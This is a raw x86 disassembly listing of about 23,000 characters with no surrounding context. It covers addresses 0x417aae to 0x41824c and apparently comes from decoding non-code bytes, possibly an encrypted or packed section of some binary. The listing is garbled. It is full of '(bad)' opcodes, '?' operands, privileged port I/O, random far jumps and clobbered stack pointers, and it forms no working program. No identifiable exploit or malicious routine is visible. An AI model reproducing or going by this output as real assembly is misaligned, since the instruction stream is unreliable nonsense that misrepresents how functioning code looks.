  417aae:	xor    ecx,DWORD PTR [esp+ecx*2+0x3f02c4d0]
  417ab5:	or     esp,ebp
  417ab7:	pop    esp
  417ab8:	or     eax,0x25b742df
  417abd:	clc    
  417abe:	sub    BYTE PTR [edi+edi*1+0x6daebbe0],dh
  417ac5:	std    
  417ac6:	mov    al,0x39
  417ac8:	aas    
  417ac9:	push   cs
  417aca:	xchg   DWORD PTR [esi],edx
  417acc:	xlat   BYTE PTR ds:[ebx]
  417acd:	or     esp,ecx
  417acf:	imul   esp,ebx,0x755f6245
  417ad5:	xchg   ecx,eax
  417ad6:	std    
  417ad7:	mov    ebx,0xb4082544
  417adc:	xor    DWORD PTR [esi-0x47],ebx
  417adf:	loope  0x417b18
  417ae1:	and    esp,DWORD PTR [esi-0x28]
  417ae4:	lea    ebp,[ebx+0x33954247]
  417aea:	lock xor al,BYTE PTR [edx]
  417aed:	xor    DWORD PTR [ebx-0x34],ecx
  417af0:	fxrstor [ecx-0x60]
  417af4:	inc    eax
  417af5:	mov    eax,ds
  417af7:	int3   
  417af8:	mov    bh,0xd5
  417afa:	push   ecx
  417afb:	and    eax,0xda3cbced
  417b00:	call   eax
  417b02:	mov    esi,0xdd7c5844
  417b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b08:	mov    ebx,0x386d203f
  417b0d:	push   DWORD PTR ds:0x5bb84871
  417b13:	sub    BYTE PTR [edx],ch
  417b15:	repz adc al,ah
  417b18:	or     eax,0xc595e64
  417b1d:	mov    al,ds:0x991a30a9
  417b22:	mov    ch,0x81
  417b24:	mov    WORD PTR [esp+ebx*4+0x61],?
  417b28:	xor    edi,eax
  417b2a:	pop    ebx
  417b2b:	call   0x65d5:0x580d6270
  417b32:	mov    ecx,0xd5712472
  417b37:	xchg   BYTE PTR [edx+0x72],al
  417b3a:	pushf  
  417b3b:	sbb    bl,BYTE PTR [eax+ecx*8+0x48]
  417b3f:	adc    eax,0x57e5273d
  417b44:	rcl    DWORD PTR [eax],1
  417b46:	mov    dl,0x21
  417b49:	adc    BYTE PTR [ebx],ch
  417b4b:	adc    dl,BYTE PTR [esi-0x5b2a213]
  417b51:	jb     0x417afc
  417b53:	imul   edi,DWORD PTR [esi+0x4b],0x46
  417b57:	cld    
  417b58:	stos   DWORD PTR es:[edi],eax
  417b59:	or     BYTE PTR [ebp+0x38ee7850],dh
  417b5f:	sub    BYTE PTR [ebp+0x71],ch
  417b62:	mov    edx,0xf420324b
  417b67:	add    dh,BYTE PTR [ebp+esi*1+0x25bf1bda]
  417b6e:	daa    
  417b6f:	ins    DWORD PTR es:[edi],dx
  417b70:	mov    edi,0xe39e3e44
  417b75:	out    0x70,al
  417b77:	xchg   esi,eax
  417b78:	dec    esp
  417b79:	or     ch,BYTE PTR [eax+0x135dd909]
  417b7f:	mov    bl,bl
  417b81:	cmp    al,0x6e
  417b83:	or     DWORD PTR [esi],edi
  417b85:	test   eax,0x7d0d6a3e
  417b8a:	fist   WORD PTR [eax+0x7a]
  417b8d:	and    al,0xbb
  417b8f:	test   eax,0x7338b4a
  417b95:	mov    al,0xea
  417b97:	arpl   WORD PTR [eax-0x6c],ax
  417b9a:	mov    dl,0x3c
  417b9c:	cmp    DWORD PTR [edx],esp
  417b9e:	pop    es
  417b9f:	gs mov bl,0x60
  417ba3:	lea    ebp,[edx+eax*4]
  417ba6:	or     eax,0x754ec54b
  417bab:	fnstsw WORD PTR [esi]
  417bad:	outs   dx,DWORD PTR ds:[esi]
  417bae:	pop    ss
  417baf:	(bad)  
  417bb0:	mov    al,0xc1
  417bb2:	sar    cl,cl
  417bb4:	scas   eax,DWORD PTR es:[edi]
  417bb5:	enter  0x4adb,0x97
  417bb9:	pop    esi
  417bba:	outs   dx,BYTE PTR ds:[esi]
  417bbb:	jp     0x417b4e
  417bbd:	push   esi
  417bbe:	mov    ch,0xd0
  417bc0:	jg     0x417b95
  417bc2:	imul   ebp,DWORD PTR [esi],0xffffffc1
  417bc5:	not    BYTE PTR [eax]
  417bc7:	inc    esi
  417bc8:	xor    BYTE PTR [esi+eiz*1],0xb4
  417bcc:	call   0x5c8:0x3fcc2d6f
  417bd3:	in     al,dx
  417bd4:	or     BYTE PTR [ebp-0x6e4e502],bh
  417bda:	in     eax,0xdd
  417bdc:	das    
  417bdd:	dec    ebp
  417bde:	sbb    BYTE PTR [edx-0x1a4f23ff],0x30
  417be5:	jae    0x417bc8
  417be7:	fwait
  417be8:	jle    0x417c4c
  417bea:	add    al,BYTE PTR [edi-0x9c212d4]
  417bf0:	and    BYTE PTR [ebp-0x7795e2a3],dl
  417bf6:	mov    bh,0x68
  417bf8:	outs   dx,DWORD PTR fs:[esi]
  417bfa:	pop    ebp
  417bfb:	cld    
  417bfc:	loop   0x417be1
  417bfe:	inc    ebx
  417bff:	call   0x87ec:0xcec689e5
  417c06:	test   BYTE PTR [edx+0x1017acb],cl
  417c0c:	shl    BYTE PTR [edx],cl
  417c0e:	js     0x417c4e
  417c10:	mov    ds:0xc1f31944,al
  417c15:	xor    al,BYTE PTR [ebp-0x3b]
  417c18:	pop    es
  417c19:	adc    al,0x8d
  417c1b:	inc    ecx
  417c1c:	lods   al,BYTE PTR ds:[esi]
  417c1d:	cmp    BYTE PTR gs:[edx+0x68],0x5e
  417c22:	test   BYTE PTR [ebx],al
  417c24:	in     al,dx
  417c25:	arpl   WORD PTR [ecx],bx
  417c27:	repz fcomp DWORD PTR [edx+0x43]
  417c2b:	add    eax,0xf54a68e9
  417c30:	sbb    bh,BYTE PTR [ebx+0xb]
  417c33:	sbb    eax,0xd5400810
  417c38:	hlt    
  417c39:	rcl    BYTE PTR [edi+0x6],cl
  417c3c:	jecxz  0x417c33
  417c3e:	jg     0x417bf0
  417c40:	dec    edi
  417c41:	test   eax,0x42c9d4bf
  417c46:	lods   eax,DWORD PTR ds:[esi]
  417c47:	ds lods al,BYTE PTR gs:[esi]
  417c4a:	into   
  417c4b:	outs   dx,BYTE PTR ds:[esi]
  417c4c:	(bad)  
  417c4d:	pushf  
  417c4e:	cld    
  417c4f:	shl    BYTE PTR [esi],cl
  417c51:	jl     0x417c96
  417c53:	das    
  417c54:	cmp    ebp,DWORD PTR ds:0x9d7d8b74
  417c5a:	test   eax,0x1f9055dc
  417c5f:	inc    edx
  417c60:	dec    edx
  417c61:	sti    
  417c62:	xchg   DWORD PTR [eax+0x8],ecx
  417c65:	ins    DWORD PTR es:[edi],dx
  417c66:	call   0xc81db18
  417c6b:	out    dx,al
  417c6c:	fs fwait
  417c6e:	lock sub ebx,DWORD PTR [ecx]
  417c71:	mov    DWORD PTR [edx-0x2a],ebx
  417c74:	in     eax,0xb
  417c76:	and    dl,BYTE PTR ds:0x5bb2843f
  417c7c:	dec    edx
  417c7d:	test   al,0x17
  417c7f:	mov    ?,WORD PTR [esi]
  417c81:	add    BYTE PTR [ecx-0x4cb41413],0x20
  417c88:	and    DWORD PTR [ebp+0x10],esi
  417c8b:	and    dh,BYTE PTR [esi]
  417c8d:	repnz adc dl,BYTE PTR [edx+ebp*1-0x6e]
  417c92:	pusha  
  417c93:	pusha  
  417c94:	sbb    eax,0xe4489186
  417c99:	stc    
  417c9a:	imul   bl
  417c9c:	clc    
  417c9d:	fidiv  WORD PTR [edi-0x5af498f5]
  417ca3:	repz hlt 
  417ca5:	mov    bh,0xd7
  417ca7:	cmp    esp,esp
  417ca9:	inc    edx
  417caa:	lea    esp,[eax]
  417cac:	pop    ss
  417cad:	adc    edi,esp
  417caf:	xchg   ecx,eax
  417cb0:	(bad)  
  417cb2:	inc    ebx
  417cb3:	adc    al,0xd0
  417cb5:	ins    DWORD PTR es:[edi],dx
  417cb6:	shr    BYTE PTR [esi-0x5a],cl
  417cb9:	cmp    BYTE PTR ds:0x918d13a2,0xcf
  417cc0:	ss ja  0x417c80
  417cc3:	data16 je 0x417c80
  417cc6:	jg     0x417cbf
  417cc8:	sub    esp,DWORD PTR ds:0x41d3238a
  417cce:	shl    DWORD PTR [ebp-0x3733b1c3],cl
  417cd4:	arpl   WORD PTR [eax+0x74046fd4],si
  417cda:	push   cs
  417cdb:	inc    edi
  417cdc:	fs int3 
  417cde:	lds    ebp,FWORD PTR [edx+ebx*4-0x474588d1]
  417ce5:	inc    ecx
  417ce6:	gs cld 
  417ce8:	loop   0x417d3a
  417cea:	jo     0x417cb3
  417cec:	xchg   esp,eax
  417ced:	out    dx,al
  417cee:	(bad)  
  417cef:	ds (bad) 
  417cf1:	inc    DWORD PTR [esi]
  417cf3:	mov    al,BYTE PTR [ebx+0x3b]
  417cf6:	dec    eax
  417cf7:	xor    al,cl
  417cf9:	push   cs
  417cfa:	xor    al,BYTE PTR [ebp+0x3e]
  417cfd:	and    eax,0xed02d26c
  417d02:	xor    eax,0x9f23557a
  417d07:	mov    esi,0xa842e7c7
  417d0c:	sbb    ah,ch
  417d0e:	xchg   edi,eax
  417d0f:	or     DWORD PTR [ecx],edi
  417d11:	daa    
  417d12:	rcr    ah,1
  417d14:	cmp    bl,0xc8
  417d17:	out    dx,al
  417d18:	or     al,0xb8
  417d1a:	or     DWORD PTR [edi-0x45],0x681e76c7
  417d21:	or     bh,ah
  417d23:	pop    edi
  417d24:	jnp    0x417cdd
  417d26:	sahf   
  417d27:	mov    ecx,0x1b5214de
  417d2c:	leave  
  417d2d:	add    edi,ecx
  417d2f:	inc    edi
  417d30:	cmp    BYTE PTR [edi],ch
  417d32:	sbb    ebp,esi
  417d34:	add    DWORD PTR [esi],eax
  417d36:	cmp    ebp,DWORD PTR [bx+si-0x5a]
  417d3a:	pop    es
  417d3b:	inc    esp
  417d3c:	(bad)  
  417d3d:	mov    ebx,0xdc6b528b
  417d42:	push   eax
  417d43:	mov    ds:0x99fca539,al
  417d48:	clc    
  417d49:	ror    bl,cl
  417d4b:	gs mov cl,0x2c
  417d4e:	fldcw  WORD PTR [esi+0x41]
  417d51:	popf   
  417d52:	xchg   ebp,eax
  417d53:	sahf   
  417d54:	aas    
  417d55:	mov    ds:0xe86eaaaa,eax
  417d5a:	sbb    BYTE PTR [ebx-0x23],cl
  417d5d:	imul   ebx,DWORD PTR [ecx+0x19]
  417d61:	pop    eax
  417d62:	out    dx,al
  417d63:	mov    ebx,0x4ac129c3
  417d68:	in     al,0x7e
  417d6a:	idiv   DWORD PTR [edi]
  417d6c:	in     al,dx
  417d6d:	dec    edi
  417d6e:	sbb    DWORD PTR [eax+0x58],eax
  417d71:	mov    cl,0xaa
  417d73:	add    al,0x77
  417d75:	xlat   BYTE PTR ds:[ebx]
  417d76:	retf   
  417d77:	mov    esp,0x28431948
  417d7c:	xchg   esi,eax
  417d7d:	jmp    0x417d92
  417d7f:	sti    
  417d80:	gs mov edx,0xa221d7a7
  417d86:	cs pushf 
  417d88:	outs   dx,DWORD PTR ds:[esi]
  417d89:	or     ah,dl
  417d8b:	jp     0x417dd3
  417d8d:	sbb    esi,ebp
  417d8f:	daa    
  417d90:	test   BYTE PTR [ebx+0x5c],dl
  417d93:	aaa    
  417d94:	imul   edx,DWORD PTR [esi-0x6a81d3c2],0xfffffffe
  417d9b:	or     dh,BYTE PTR [eax+0x31]
  417d9e:	push   esi
  417d9f:	jecxz  0x417d66
  417da1:	sbb    BYTE PTR [ecx],0x56
  417da4:	popa   
  417da5:	and    bl,BYTE PTR [edx+0xde3d30b]
  417dab:	aad    0x7c
  417dad:	ror    DWORD PTR [esi-0x4a],1
  417db0:	jge    0x417dac
  417db2:	mov    al,0x77
  417db4:	or     al,0x73
  417db6:	aam    0x99
  417db8:	sahf   
  417db9:	push   0x28ea05e
  417dbe:	xchg   ch,cl
  417dc0:	into   
  417dc1:	into   
  417dc2:	xchg   ebx,eax
  417dc3:	repz adc eax,0x72bb92d2
  417dc9:	fbld   TBYTE PTR [ebp-0x11]
  417dcc:	aaa    
  417dcd:	dec    edx
  417dce:	push   esp
  417dcf:	call   0x7715f90d
  417dd4:	inc    ebp
  417dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd6:	and    BYTE PTR [edx],ah
  417dd8:	xchg   ecx,eax
  417dd9:	cmp    eax,0x7195b191
  417dde:	test   eax,0x3633dd9d
  417de3:	push   es
  417de4:	lock mov DWORD PTR [ebx+0x1b3cc731],ecx
  417deb:	dec    esp
  417dec:	dec    eax
  417ded:	mov    ?,edi
  417def:	inc    esi
  417df0:	neg    DWORD PTR [ebx+0x62c0edd3]
  417df6:	dec    DWORD PTR [ebx-0x20]
  417df9:	jl     0x417d98
  417dfb:	xchg   esp,eax
  417dfc:	outs   dx,DWORD PTR ds:[esi]
  417dfd:	(bad)  [ecx*8+0x65df953d]
  417e04:	rcl    eax,0x8
  417e07:	sub    DWORD PTR [eax],0x52
  417e0a:	clts   
  417e0c:	sbb    eax,0x92f8ff48
  417e11:	and    eax,0x6171ee10
  417e16:	jmp    0x9d7f:0xdc3186c8
  417e1d:	mov    bh,0x63
  417e1f:	in     al,0x73
  417e21:	push   ebp
  417e22:	xchg   DWORD PTR [esi],esp
  417e24:	jmp    0x7c2d7b77
  417e29:	mov    ch,0xd2
  417e2b:	pop    esp
  417e2c:	mov    eax,ds:0x298aa10
  417e31:	jns    0x417ea9
  417e33:	stos   BYTE PTR es:[edi],al
  417e34:	cmp    edi,0xfcd33f67
  417e3a:	mov    bh,0x2f
  417e3c:	push   esi
  417e3d:	dec    ebp
  417e3e:	jbe    0x417e9a
  417e40:	jo     0x417e86
  417e42:	test   eax,0x5927bb3b
  417e47:	sub    ebx,DWORD PTR ds:[esi-0x5]
  417e4b:	pop    ecx
  417e4c:	mov    dl,0x98
  417e4e:	jl     0x417e91
  417e50:	jnp    0x417ecf
  417e52:	inc    edi
  417e53:	jmp    0xfdcc4e72
  417e58:	and    DWORD PTR [ebp+0x4ee70e48],eax
  417e5e:	les    ecx,FWORD PTR [edi]
  417e60:	daa    
  417e61:	or     edi,DWORD PTR [edi+edx*8-0x4]
  417e65:	sbb    eax,0xab882443
  417e6a:	mov    ch,0xe6
  417e6c:	push   ebx
  417e6d:	stos   DWORD PTR es:[edi],eax
  417e6e:	sti    
  417e6f:	jmp    FWORD PTR [ebx]
  417e71:	or     al,0x4b
  417e73:	sub    bh,BYTE PTR [ebx+edx*2+0x7449db44]
  417e7a:	cli    
  417e7b:	dec    esi
  417e7c:	arpl   bp,si
  417e7e:	inc    ebp
  417e7f:	add    eax,0xb6bdd669
  417e84:	stos   DWORD PTR es:[edi],eax
  417e85:	push   es
  417e86:	leave  
  417e87:	adc    bl,BYTE PTR [ecx]
  417e89:	xchg   edi,eax
  417e8a:	pop    ebx
  417e8b:	mov    bh,0x29
  417e8d:	and    ebp,DWORD PTR [ebp-0x1d]
  417e90:	and    DWORD PTR [edx+0x69],eax
  417e93:	sahf   
  417e94:	sub    edx,DWORD PTR [edx-0x59]
  417e97:	sub    al,0x2
  417e99:	pop    edi
  417e9a:	mov    ch,0xbf
  417e9c:	iret   
  417e9d:	cmp    al,0xc
  417e9f:	xchg   esi,eax
  417ea0:	shr    DWORD PTR [eax+0x29],cl
  417ea3:	push   eax
  417ea4:	js     0x417ea4
  417ea6:	hlt    
  417ea7:	outs   dx,DWORD PTR ds:[esi]
  417ea8:	scas   eax,DWORD PTR es:[edi]
  417ea9:	push   ds
  417eaa:	rol    ecx,cl
  417eac:	test   al,0x5f
  417eae:	(bad)  
  417eb0:	sahf   
  417eb1:	push   edx
  417eb2:	lea    esp,[ebx+0x6d27fa66]
  417eb8:	mov    esi,edi
  417eba:	inc    esi
  417ebb:	call   0x27129fe4
  417ec0:	adc    DWORD PTR [ebp+0x3d50d099],edx
  417ec6:	and    BYTE PTR [ecx+0x78e5d159],bl
  417ecc:	adc    al,0xf4
  417ece:	lods   al,BYTE PTR ds:[esi]
  417ecf:	dec    edx
  417ed0:	ret    
  417ed1:	mov    ecx,0xd1c386cd
  417ed6:	aad    0x2
  417ed8:	call   0xc5f1bf8d
  417edd:	push   edx
  417ede:	add    al,0x6e
  417ee0:	sub    BYTE PTR [edx],al
  417ee2:	scas   eax,DWORD PTR es:[edi]
  417ee3:	js     0x417f5c
  417ee5:	jge    0x417e70
  417ee7:	push   edx
  417ee8:	and    ebp,esi
  417eea:	pxor   mm3,mm5
  417eed:	mov    dl,0xbf
  417eef:	scas   al,BYTE PTR es:[edi]
  417ef0:	cwde   
  417ef1:	into   
  417ef2:	das    
  417ef3:	mov    al,0x49
  417ef5:	sbb    BYTE PTR [eax-0x2523be5],bl
  417efb:	popf   
  417efc:	mov    DWORD PTR es:[esi],edi
  417eff:	mov    bl,0x50
  417f01:	mov    al,bh
  417f03:	mov    WORD PTR [eax+0x42],fs
  417f06:	mov    esp,0x16a624e1
  417f0b:	ret    0xca9d
  417f0e:	sub    esi,DWORD PTR [esi+0x36]
  417f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f12:	mov    esi,0x3edba321
  417f17:	inc    esp
  417f18:	test   al,0x4c
  417f1a:	mov    esp,0xf64de546
  417f1f:	inc    edx
  417f20:	clc    
  417f21:	dec    eax
  417f22:	xor    al,ah
  417f24:	popf   
  417f25:	jbe    0x417f86
  417f27:	out    0xa6,eax
  417f29:	cmp    al,0x1a
  417f2b:	pop    esp
  417f2c:	cld    
  417f2d:	xchg   ebx,eax
  417f2e:	xchg   eax,edx
  417f30:	rcl    DWORD PTR [edx-0x48b9bd95],cl
  417f36:	jmp    0x8b1e:0x79a78bc8
  417f3d:	push   ss
  417f3e:	enter  0x5167,0x17
  417f42:	lea    eax,[esi-0x59]
  417f45:	shl    BYTE PTR [edi-0xc],0x51
  417f49:	std    
  417f4a:	stos   BYTE PTR es:[edi],al
  417f4b:	jb     0x417efd
  417f4d:	jae    0x417fcd
  417f4f:	ja     0x417f00
  417f51:	add    DWORD PTR [edx-0x39],0x72771a3a
  417f58:	iret   
  417f59:	mov    ds:0xfadd2ae1,eax
  417f5e:	stc    
  417f5f:	rcr    DWORD PTR [edi*8-0x4dc8cfef],cl
  417f66:	stos   DWORD PTR es:[edi],eax
  417f67:	push   edx
  417f68:	shl    BYTE PTR [esp+eiz*8],0x19
  417f6c:	popa   
  417f6d:	ja     0x417efb
  417f6f:	das    
  417f70:	scas   eax,DWORD PTR es:[edi]
  417f71:	sbb    BYTE PTR [ecx],cl
  417f73:	ror    BYTE PTR [esi+0x2f776343],cl
  417f79:	cld    
  417f7a:	and    BYTE PTR [ebp-0x63],bl
  417f7d:	mov    bh,BYTE PTR [esp+esi*8+0x7b72ae51]
  417f84:	or     al,0x53
  417f86:	ror    BYTE PTR [eax-0x11],0xd7
  417f8a:	cmp    ecx,esi
  417f8c:	or     esi,DWORD PTR [edx+eiz*1+0x2b]
  417f90:	lock popa 
  417f92:	sub    BYTE PTR [edi-0x25],bh
  417f95:	pop    edi
  417f96:	mov    dl,0x4c
  417f98:	jno    0x417f23
  417f9a:	aam    0x88
  417f9c:	or     ebp,ebx
  417f9e:	leave  
  417f9f:	sbb    edi,ecx
  417fa1:	loopne 0x417faa
  417fa3:	jo     0x417f56
  417fa5:	push   0xdea2c28d
  417faa:	add    DWORD PTR [ebx],edi
  417fac:	test   BYTE PTR [edi],al
  417fae:	mov    BYTE PTR [edx+0x6e1b1948],cl
  417fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb5:	inc    ebp
  417fb6:	iret   
  417fb7:	div    ah
  417fb9:	call   0x80480bb2
  417fbe:	xor    al,0x5
  417fc0:	(bad)  
  417fc1:	sbb    DWORD PTR [edi+0x122d06c5],edi
  417fc7:	or     ah,bh
  417fc9:	enter  0x8997,0xba
  417fcd:	jp     0x418016
  417fcf:	mov    DWORD PTR [ebx-0x1a9141d],edi
  417fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd6:	jge    0x417ff0
  417fd8:	test   eax,0x69462d1
  417fdd:	lea    ebx,[ebp+0x45]
  417fe0:	dec    edx
  417fe1:	or     ch,BYTE PTR [ecx-0x1c]
  417fe4:	sub    al,0x93
  417fe6:	(bad)  
  417fe7:	faddp  st(1),st
  417fe9:	dec    BYTE PTR [eax]
  417feb:	nop
  417fec:	add    eax,0x12d94273
  417ff1:	mov    bh,0xfe
  417ff3:	pop    es
  417ff4:	xor    bl,0x26
  417ff7:	push   ds
  417ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff9:	cld    
  417ffa:	out    0xa8,eax
  417ffc:	sbb    edi,DWORD PTR ds:0xf0a3e566
  418002:	pop    es
  418003:	pop    ebp
  418004:	call   0xd2922226
  418009:	ret    0x6e9b
  41800c:	dec    edx
  41800d:	sub    DWORD PTR [ebx],ebx
  41800f:	xlat   BYTE PTR ds:[ebx]
  418010:	mov    edi,0x24e16c6
  418015:	jo     0x417fe7
  418017:	pop    edx
  418018:	inc    edi
  418019:	sbb    eax,0xef6e45a0
  41801e:	cmc    
  41801f:	fild   WORD PTR [edi]
  418021:	jp     0x417fb3
  418023:	mov    bl,0x79
  418025:	(bad)  
  418026:	pop    ss
  418027:	push   ds
  418028:	clc    
  418029:	push   edi
  41802a:	sub    DWORD PTR [edx+eax*8-0x6fbaa593],ebx
  418031:	std    
  418032:	cmp    al,0xbb
  418034:	xchg   ebp,eax
  418035:	stos   DWORD PTR es:[edi],eax
  418036:	jno    0x418085
  418038:	mov    ah,0xce
  41803a:	xor    BYTE PTR [edx],al
  41803c:	xor    esp,DWORD PTR [ecx]
  41803e:	cmp    edi,DWORD PTR [ebx-0x3b]
  418041:	push   ss
  418042:	push   edi
  418043:	sbb    al,0xa6
  418045:	dec    esp
  418046:	sti    
  418047:	add    DWORD PTR [ebx-0x13],ebx
  41804a:	and    ecx,DWORD PTR [ecx]
  41804c:	sbb    dl,BYTE PTR [edi+0x477c658f]
  418052:	lock lea esp,[eax+esi*2]
  418056:	ins    BYTE PTR es:[edi],dx
  418057:	les    ecx,FWORD PTR [edi+0x39]
  41805a:	cli    
  41805b:	push   ss
  41805c:	mov    dh,0x16
  41805e:	inc    edi
  41805f:	pop    edx
  418060:	inc    ebp
  418061:	push   ss
  418062:	jl     0x418050
  418064:	cli    
  418065:	adc    al,0x9a
  418067:	mov    bl,0xc2
  418069:	add    al,0xb3
  41806b:	inc    eax
  41806c:	arpl   WORD PTR [ecx],dx
  41806e:	push   esi
  41806f:	cdq    
  418070:	push   es
  418071:	lds    edi,FWORD PTR [ebp-0x7]
  418074:	pop    edx
  418075:	inc    ebx
  418076:	xor    bh,BYTE PTR [edx+0x1468924e]
  41807c:	sti    
  41807d:	repz add al,0x28
  418080:	fadd   DWORD PTR [ebp-0x58]
  418083:	add    eax,0x4ee12cd
  418088:	mov    edi,0x76cf6552
  41808d:	mov    edi,ebp
  41808f:	test   al,0x81
  418091:	jae    0x418016
  418093:	and    eax,DWORD PTR [esi]
  418095:	ja     0x418056
  418097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418098:	inc    ecx
  418099:	pop    ds
  41809a:	fist   DWORD PTR [ebx]
  41809c:	or     eax,0xfdfebf64
  4180a1:	xor    ah,BYTE PTR [eax+ebx*2-0x53d2f3]
  4180a8:	jns    0x418036
  4180aa:	shr    BYTE PTR [edx+eiz*4+0x7a],0xdf
  4180af:	jl     0x4180ca
  4180b1:	test   al,cl
  4180b3:	or     DWORD PTR [ebp-0x32],ebp
  4180b6:	inc    edi
  4180b7:	aam    0x9
  4180b9:	mov    esi,0x36ebee4c
  4180be:	inc    edx
  4180bf:	cmp    ebp,DWORD PTR [ecx+esi*4-0x6b7bf0ea]
  4180c6:	pop    ss
  4180c7:	in     eax,dx
  4180c8:	jb     0x4180ea
  4180ca:	and    al,0x36
  4180cc:	test   BYTE PTR ds:0x94d1c995,dh
  4180d2:	int3   
  4180d3:	iret   
  4180d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180d5:	pop    esi
  4180d6:	imul   ebp,DWORD PTR [esi],0x73
  4180d9:	shr    BYTE PTR [ebp+0x21],cl
  4180dc:	inc    esp
  4180dd:	jbe    0x418098
  4180df:	cli    
  4180e0:	jnp    0x41813a
  4180e2:	(bad)  
  4180e3:	xchg   ecx,eax
  4180e4:	stos   DWORD PTR es:[edi],eax
  4180e5:	dec    esi
  4180e6:	push   0xffffffcb
  4180e8:	stc    
  4180e9:	mov    dl,0xfd
  4180eb:	popf   
  4180ec:	mov    WORD PTR [ebp-0x52090303],gs
  4180f2:	jbe    0x41810d
  4180f4:	cmc    
  4180f5:	inc    esi
  4180f6:	out    0x93,eax
  4180f8:	dec    esi
  4180f9:	jl     0x418165
  4180fb:	push   0x54
  4180fd:	adc    ebp,esi
  4180ff:	mov    dl,0x8f
  418101:	ret    
  418102:	mov    ah,0xb4
  418104:	or     al,BYTE PTR [ebp-0x77]
  418107:	data16 movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41810a:	and    al,ah
  41810c:	mov    esp,0x6ef6e769
  418111:	mov    ?,eax
  418113:	add    ebx,DWORD PTR [ebx]
  418115:	stos   BYTE PTR es:[edi],al
  418116:	std    
  418117:	inc    ecx
  418118:	jmp    0xf54aac95
  41811d:	pop    ss
  41811e:	push   es
  41811f:	ds mov ebx,0x1a80bb87
  418125:	push   ebp
  418126:	lods   al,BYTE PTR ds:[esi]
  418127:	das    
  418128:	popf   
  418129:	cmp    BYTE PTR [esi+eax*8],al
  41812c:	stos   DWORD PTR es:[edi],eax
  41812d:	push   esp
  41812e:	and    al,0x28
  418130:	fmul   DWORD PTR [edi-0x68]
  418133:	je     0x418193
  418135:	xor    eax,0xb1a91652
  41813a:	xor    DWORD PTR [eax+0x40f027f5],eax
  418140:	mov    WORD PTR [ebp-0x6d97f9f0],es
  418146:	jl     0x4181a1
  418148:	(bad)  
  418149:	sbb    edi,DWORD PTR ds:0x3f49cb15
  41814f:	test   eax,0x466d4a6c
  418154:	stc    
  418155:	dec    eax
  418156:	and    DWORD PTR [edi],esi
  418158:	dec    esi
  418159:	cmp    BYTE PTR [edi],al
  41815b:	(bad)  
  41815c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41815d:	inc    ebx
  41815e:	xor    bh,BYTE PTR [ebx]
  418160:	sub    eax,0x5648da55
  418165:	dec    esi
  418166:	ss ds push ebx
  418169:	mov    es,WORD PTR [ecx]
  41816b:	outs   dx,BYTE PTR ds:[esi]
  41816c:	popa   
  41816d:	push   ebx
  41816e:	mov    ebx,0x4bd62fb4
  418173:	and    al,0x26
  418175:	push   esp
  418176:	imul   ebx,DWORD PTR [edi+0x7d09f6a2],0xffffffbf
  41817d:	add    eax,0x17ee7805
  418182:	pusha  
  418183:	xchg   ebx,eax
  418184:	popf   
  418185:	xor    DWORD PTR [ebp+0x7e4c6747],eax
  41818b:	pop    edi
  41818c:	test   DWORD PTR [ebp+0x21],ebp
  41818f:	les    esp,FWORD PTR [eax+0x58]
  418192:	push   edx
  418193:	cmp    al,0x5a
  418195:	in     eax,0x8e
  418197:	jnp    0x41812c
  418199:	push   ebp
  41819a:	xor    BYTE PTR [ecx-0x7d8255cf],bl
  4181a0:	mov    ss:0x7028a1c3,al
  4181a6:	cwde   
  4181a7:	call   FWORD PTR fs:[esi+ebp*2-0x3057f5ec]
  4181af:	(bad)  [ebx+0x4c4c4afd]
  4181b5:	cli    
  4181b6:	pop    ss
  4181b7:	xchg   ebp,eax
  4181b8:	ror    DWORD PTR [ebx],cl
  4181ba:	call   0x51bef0e6
  4181bf:	dec    eax
  4181c0:	cmp    eax,edi
  4181c2:	adc    BYTE PTR [eax+0x4],bh
  4181c5:	push   esi
  4181c6:	ds mov dh,0xd3
  4181c9:	push   eax
  4181ca:	xchg   ebx,eax
  4181cb:	jae    0x418155
  4181cd:	lds    edi,FWORD PTR cs:[ebx-0x56b7e867]
  4181d4:	fincstp 
  4181d6:	scas   al,BYTE PTR es:[edi]
  4181d7:	and    DWORD PTR [edx-0x25],0xffffffe5
  4181db:	mov    WORD PTR [ecx+ebp*8],gs
  4181de:	ror    DWORD PTR [edi+0x5a],0xf1
  4181e2:	jmp    0x418244
  4181e4:	ss pop ebx
  4181e6:	xchg   ecx,eax
  4181e7:	loopne 0x4181b7
  4181e9:	and    ebx,DWORD PTR [ecx+0x49]
  4181ec:	arpl   WORD PTR [edi],si
  4181ee:	ins    BYTE PTR es:[edi],dx
  4181ef:	jmp    0x418173
  4181f1:	mov    ds:0x92a6b8e4,al
  4181f6:	(bad)  
  4181f7:	into   
  4181f8:	mov    bl,0xc5
  4181fa:	adc    al,BYTE PTR [ebx]
  4181fc:	add    bh,0xa1
  4181ff:	and    eax,0x289de369
  418204:	data16 fwait
  418206:	xor    al,0x7c
  418208:	ja     0x41818e
  41820a:	mov    ch,0x9a
  41820c:	jae    0x418200
  41820e:	sar    edx,0x2e
  418211:	das    
  418212:	into   
  418213:	repnz lahf 
  418215:	je     0x4181b8
  418217:	div    DWORD PTR [eax]
  418219:	imul   esp,DWORD PTR [ecx],0x9930dc23
  41821f:	xchg   edi,eax
  418220:	test   al,0xe1
  418222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418223:	xlat   BYTE PTR ds:[ebx]
  418224:	into   
  418225:	mov    dl,0xa6
  418227:	iret   
  418228:	(bad)  
  418229:	not    bh
  41822b:	inc    esp
  41822c:	in     eax,dx
  41822d:	repnz fstp DWORD PTR [ecx]
  418230:	push   edi
  418231:	jno    0x41826b
  418233:	gs mov cs,ebx
  418236:	mov    bh,0x39
  418238:	sub    esp,0xab62ca11
  41823e:	ss ins BYTE PTR es:[edi],dx
  418240:	and    al,0x4d
  418242:	stc    
  418243:	aad    0x14
  418245:	stos   BYTE PTR es:[edi],al
  418246:	or     edi,0x743f85f9
  41824c:	push   ds
